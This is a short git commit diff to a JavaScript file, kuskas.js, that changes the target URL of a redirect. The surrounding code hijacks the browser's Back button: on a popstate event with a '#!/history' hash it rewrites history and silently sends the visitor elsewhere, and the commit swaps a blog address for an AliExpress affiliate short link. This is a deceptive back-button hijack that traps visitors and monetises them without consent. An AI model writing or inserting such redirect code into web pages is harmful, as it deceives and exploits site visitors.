2a03c29651b51eeddc6536b45f6050e95b173d99
lookatdons <lookatdons@users.noreply.github.com>
2023-09-20 20:02:12 +0700

    Update kuskas.js

--- kuskas.js
+++ kuskas.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://circleoftoast.blogspot.com/"); 
+      location.replace("https://s.click.aliexpress.com/e/_mrgrkEe"); 
     },10); 
   } 
 }, false); 
